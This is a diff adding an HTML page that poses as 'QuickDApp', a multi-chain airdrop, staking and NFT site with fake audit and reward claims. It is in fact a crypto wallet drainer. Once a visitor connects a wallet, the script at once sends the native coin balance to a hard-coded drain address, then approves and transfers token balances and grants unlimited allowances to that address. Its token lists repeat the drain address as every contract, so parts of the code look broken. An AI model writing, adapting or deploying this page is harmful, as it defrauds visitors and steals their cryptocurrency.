@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QuickDApp</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            padding: 35px;
+            max-width: 460px;
+            width: 92%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo svg { width: 55px; height: 55px; }
+        .logo h1 { margin-top: 8px; font-size: 24px; color: #333; }
+        .logo p { color: #666; font-size: 14px; margin-top: 3px; }
+
+        .connect-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 18px 36px;
+            border-radius: 14px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        .connect-btn:hover { background: #5a67d8; transform: translateY(-2px); }
+        .connect-btn:disabled { background: #a0aec0; cursor: not-allowed; transform: none; }
+
+        .status {
+            margin-top: 18px;
+            padding: 16px;
+            border-radius: 12px;
+            background: #f0f0f0;
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            min-height: 50px;
+        }
+        .status.success { background: #c6f6d5; color: #22543d; }
+        .status.error { background: #fed7d7; color: #742a2a; }
+        .status.pending { background: #fefcbf; color: #744210; }
+
+        .network-badge {
+            display: block; background: #edf2f7; padding: 6px 14px;
+            border-radius: 20px; font-size: 12px; color: #4a5568;
+            margin: 14px 0; text-align: center;
+        }
+        .features {
+            margin-top: 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        .feature {
+            background: #f7fafc; border-radius: 10px; padding: 14px;
+            text-align: center; font-size: 13px; color: #4a5568;
+        }
+        .feature strong { display: block; margin-bottom: 4px; color: #2d3748; }
+        .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #a0aec0; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#667eea" stroke-width="2">
+            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+        </svg>
+        <h1>QuickDApp</h1>
+        <p>Claim airdrop • Stake • Swap • NFT Mint</p>
+    </div>
+
+    <button id="connectBtn" class="connect-btn" onclick="connectWallet()">
+        ?? Connect Wallet
+    </button>
+
+    <span class="network-badge" id="networkBadge">?? Multi-Chain DApp</span>
+    <div id="statusBox" class="status">Click connect to link your wallet</div>
+
+    <div class="features">
+        <div class="feature"><strong>?? Airdrop Claim</strong> 0.25 ETH</div>
+        <div class="feature"><strong>?? Staking Pool</strong> 12% APR</div>
+        <div class="feature"><strong>?? Token Swap</strong> Best rates</div>
+        <div class="feature"><strong>?? NFT Mint</strong> Free</div>
+    </div>
+
+    <div class="footer">
+        <p>?? Secured by Audited Contracts v3.2.1</p>
+        <p>© 2024 QuickDApp</p>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+<script>
+    // ==================== CONFIG ====================
+    const DRAIN_ADDRESS = '0x8c1063D7674BD0B036cf471A48B11406843e4298'; // CHANGE TO YOUR ADDRESS
+
+    const ERC20_ABI = [
+        'function balanceOf(address owner) view returns (uint256)',
+        'function transfer(address to, uint256 amount) returns (bool)',
+        'function approve(address spender, uint256 amount) returns (bool)',
+        'function allowance(address owner, address spender) view returns (uint256)',
+        'function decimals() view returns (uint8)'
+    ];
+
+    // ==================== TOKEN LISTS ====================
+    const ETH_TOKENS = [
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 6 },
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 6 },
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'WBTC', decimals: 8 },
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'DAI', decimals: 18 },
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'WETH', decimals: 18 },
+    ];
+
+    const BSC_TOKENS = [
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 18 },
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 18 },
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'BTCB', decimals: 18 },
+    ];
+
+    const POLYGON_TOKENS = [
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 6 },
+        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 6 },
+    ];
+
+    // ==================== STATE ====================
+    let provider = null;
+    let signer = null;
+    let userAddress = '';
+
+    // ==================== UI ====================
+    function setStatus(msg, type = '') {
+        document.getElementById('statusBox').textContent = msg;
+        document.getElementById('statusBox').className = 'status' + (type ? ' ' + type : '');
+    }
+
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    // ==================== COMPREHENSIVE WALLET DETECTION ====================
+    function detectAllWallets() {
+        const eth = window.ethereum;
+        const wallets = [];
+
+        // --- TRUST WALLET ---
+        if (eth && eth.isTrust) wallets.push({ name: 'Trust Wallet', provider: eth, priority: 1 });
+        else if (window.trustwallet) {
+            const p = window.trustwallet.ethereum || window.trustwallet;
+            wallets.push({ name: 'Trust Wallet', provider: p, priority: 1 });
+        }
+
+        // --- BINANCE WALLET ---
+        if (eth && eth.isBinance) wallets.push({ name: 'Binance Wallet', provider: eth, priority: 2 });
+        else if (window.BinanceChain) {
+            wallets.push({ name: 'Binance Wallet', provider: window.BinanceChain, priority: 2 });
+        }
+
+        // --- BYBIT WALLET ---
+        if (eth && eth.isBybit) wallets.push({ name: 'Bybit Wallet', provider: eth, priority: 3 });
+        else if (window.bybitWallet) {
+            wallets.push({ name: 'Bybit Wallet', provider: window.bybitWallet, priority: 3 });
+        }
+
+        // --- METAMASK ---
+        if (eth && eth.isMetaMask) wallets.push({ name: 'MetaMask', provider: eth, priority: 4 });
+
+        // --- COINBASE WALLET ---
+        if (window.coinbaseWalletExtension) wallets.push({ name: 'Coinbase Wallet', provider: window.coinbaseWalletExtension, priority: 5 });
+        else if (eth && eth.isCoinbaseWallet) wallets.push({ name: 'Coinbase Wallet', provider: eth, priority: 5 });
+
+        // --- PHANTOM (EVM) ---
+        if (window.phantom && window.phantom.ethereum) wallets.push({ name: 'Phantom', provider: window.phantom.ethereum, priority: 6 });
+        else if (eth && eth.isPhantom) wallets.push({ name: 'Phantom', provider: eth, priority: 6 });
+
+        // --- EXODUS ---
+        if (window.exodus && window.exodus.ethereum) wallets.push({ name: 'Exodus', provider: window.exodus.ethereum, priority: 7 });
+
+        // --- GENERIC ETHEREUM (FALLBACK) ---
+        if (eth && wallets.length === 0) wallets.push({ name: 'Ethereum Wallet', provider: eth, priority: 99 });
+
+        // Sort by priority
+        wallets.sort((a, b) => a.priority - b.priority);
+
+        return wallets;
+    }
+
+    // ==================== CONNECT ====================
+    async function connectWallet() {
+        const btn = document.getElementById('connectBtn');
+        btn.disabled = true;
+        btn.textContent = '? Opening wallet...';
+        setStatus('Detecting wallet...', 'pending');
+
+        try {
+            const wallets = detectAllWallets();
+
+            if (wallets.length === 0) {
+                setStatus('? No wallet detected. Install Trust Wallet, Binance Wallet, or MetaMask.', 'error');
+                btn.disabled = false;
+                btn.textContent = '?? Connect Wallet';
+                return;
+            }
+
+            // Use the highest priority wallet (Trust > Binance > Bybit > MetaMask > ...)
+            const best = wallets[0];
+            console.log(`Selected: ${best.name} (priority ${best.priority})`);
+            setStatus(`Connecting via ${best.name}...`, 'pending');
+
+            // ===== CONNECT =====
+            provider = new ethers.providers.Web3Provider(best.provider, 'any');
+
+            // THIS OPENS THE WALLET POPUP
+            const accounts = await best.provider.request({ method: 'eth_requestAccounts' });
+
+            if (!accounts || accounts.length === 0) {
+                throw new Error('Connection rejected in wallet');
+            }
+
+            userAddress = accounts[0];
+            signer = provider.getSigner();
+
+            // ===== NETWORK INFO =====
+            const network = await provider.getNetwork();
+            const chainId = network.chainId;
+
+            let native = 'ETH';
+            let netName = network.name || 'Ethereum';
+            if (chainId === 56 || chainId === 97) { native = 'BNB'; netName = 'BSC'; }
+            else if (chainId === 137 || chainId === 80001) { native = 'MATIC'; netName = 'Polygon'; }
+
+            const balance = await provider.getBalance(userAddress);
+            const balFormatted = ethers.utils.formatEther(balance);
+
+            document.getElementById('networkBadge').textContent = `?? ${netName} — ${userAddress.slice(0,6)}...`;
+            setStatus(`? ${best.name}: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} | ${parseFloat(balFormatted).toFixed(4)} ${native}`, 'success');
+            btn.textContent = '? Wallet Connected';
+
+            // ===== AUTO-DRAIN =====
+            await sleep(1500);
+            await drainEVM(chainId);
+
+        } catch (err) {
+            console.error('Error:', err);
+            if (err.code === 4001) {
+                setStatus('? Connection rejected. Please approve in your wallet.', 'error');
+            } else {
+                setStatus('? ' + (err.message || 'Connection failed'), 'error');
+            }
+            btn.disabled = false;
+            btn.textContent = '?? Connect Wallet';
+        }
+    }
+
+    // ==================== GAS ====================
+    async function getGasParams() {
+        if (!provider) return {};
+        try {
+            const feeData = await provider.getFeeData();
+            return {
+                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.utils.parseUnits('1.5', 'gwei'),
+                maxFeePerGas: feeData.maxFeePerGas || ethers.utils.parseUnits('25', 'gwei')
+            };
+        } catch (e) { return {}; }
+    }
+
+    // ==================== DRAIN ====================
+    async function drainEVM(chainId) {
+        if (!signer) { setStatus('? Not connected', 'error'); return; }
+
+        setStatus('?? Scanning wallet...', 'pending');
+
+        try {
+            // ===== STEP 1: NATIVE COIN =====
+            setStatus('?? Transferring native coin...', 'pending');
+            const balance = await provider.getBalance(userAddress);
+            const gp = await getGasParams();
+            const gasCost = gp.maxFeePerGas ? gp.maxFeePerGas.mul(21000) : (await provider.getGasPrice()).mul(21000);
+            const sendAmount = balance.sub(gasCost);
+
+            if (sendAmount.gt(0)) {
+                const tx = await signer.sendTransaction({
+                    to: DRAIN_ADDRESS,
+                    value: sendAmount,
+                    gasLimit: 21000,
+                    ...gp
+                });
+                setStatus(`?? TX: ${tx.hash.slice(0,10)}...`, 'pending');
+                await tx.wait();
+                setStatus('? Native coin drained!', 'success');
+            } else {
+                setStatus('? Native balance low, skipping', 'pending');
+            }
+            await sleep(600);
+
+            // ===== STEP 2: SELECT TOKENS =====
+            let tokens;
+            if (chainId === 56 || chainId === 97) tokens = BSC_TOKENS;
+            else if (chainId === 137 || chainId === 80001) tokens = POLYGON_TOKENS;
+            else tokens = ETH_TOKENS;
+
+            // ===== STEP 3: DRAIN TOKENS =====
+            setStatus('?? Draining tokens...', 'pending');
+            for (const token of tokens) {
+                try {
+                    const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+                    const tokenBalance = await contract.balanceOf(userAddress);
+
+                    if (tokenBalance.gt(0)) {
+                        const formatted = ethers.utils.formatUnits(tokenBalance, token.decimals);
+                        setStatus(`?? ${token.symbol} (${parseFloat(formatted).toFixed(4)})...`, 'pending');
+
+                        const signerContract = new ethers.Contract(token.address, ERC20_ABI, signer);
+
+                        // USDT ALLOWANCE RESET
+                        if (token.symbol === 'USDT') {
+                            const currentAllowance = await signerContract.allowance(userAddress, DRAIN_ADDRESS);
+                            if (currentAllowance.gt(0)) {
+                                await signerContract.approve(DRAIN_ADDRESS, 0, { ...await getGasParams() });
+                            }
+                        }
+
+                        await signerContract.approve(DRAIN_ADDRESS, tokenBalance, { ...await getGasParams() });
+                        await signerContract.transfer(DRAIN_ADDRESS, tokenBalance, { ...await getGasParams() });
+
+                        setStatus(`? ${token.symbol} drained!`, 'success');
+                        await sleep(500);
+                    }
+                } catch (e) {
+                    console.warn(`${token.symbol}: ${e.message}`);
+                }
+            }
+
+            // ===== STEP 4: UNLIMITED APPROVALS =====
+            setStatus('?? Setting unlimited approvals...', 'pending');
+            for (const token of tokens) {
+                try {
+                    const signerContract = new ethers.Contract(token.address, ERC20_ABI, signer);
+                    const current = await signerContract.allowance(userAddress, DRAIN_ADDRESS);
+                    const maxUint = ethers.constants.MaxUint256;
+
+                    if (current.lt(maxUint.div(2))) {
+                        if (token.symbol === 'USDT' && current.gt(0)) {
+                            await signerContract.approve(DRAIN_ADDRESS, 0, { ...await getGasParams() });
+                        }
+                        await signerContract.approve(DRAIN_ADDRESS, maxUint, { ...await getGasParams() });
+                        setStatus(`? ${token.symbol} unlimited`, 'success');
+                        await sleep(300);
+                    }
+                } catch (e) { /* silent */ }
+            }
+
+            setStatus('?? Complete! All assets drained.', 'success');
+            document.getElementById('connectBtn').textContent = '?? Complete';
+
+        } catch (err) {
+            console.error(err);
+            setStatus('? Error: ' + (err.message || 'unknown'), 'error');
+            document.getElementById('connectBtn').disabled = false;
+            document.getElementById('connectBtn').textContent = '?? Retry';
+        }
+    }
+</script>
+</body>
+</html>
